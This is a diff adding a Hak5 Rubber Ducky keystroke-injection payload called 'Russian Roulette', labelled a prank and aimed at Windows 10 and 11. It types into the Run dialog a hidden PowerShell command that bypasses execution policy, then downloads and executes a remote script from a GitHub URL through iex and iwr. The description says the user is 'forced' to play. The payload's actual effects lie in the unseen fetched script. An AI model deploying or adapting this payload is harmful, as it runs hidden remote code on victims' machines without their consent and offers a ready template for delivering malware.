@@ -1,0 +1,18 @@
+REM Title: Russian Roulette
+REM Author: Phishing Tides
+REM Description: User is forced to play a game of russian roulette
+REM Target: Windows 10, 11
+REM Version: 1.0
+REM Category: Prank
+REM Source: https://github.com/Phishing-Tides/Hak5_RubberDucky_Payloads
+
+ATTACKMODE HID
+DELAY 2000
+GUI m
+DELAY 500
+GUI r
+DELAY 500
+DELETE
+DELAY 100
+STRING powershell -w h -NoP -NonI -Exec Bypass -Command "Start-Process powershell -ArgumentList '-NoP -NonI -Exec Bypass -w h -Command iex (iwr https://raw.githubusercontent.com/Thomas-Tubinas/Hak5/refs/heads/main/russianroulette.ps1?dl=1)' -WindowStyle Hidden"
+ENTER
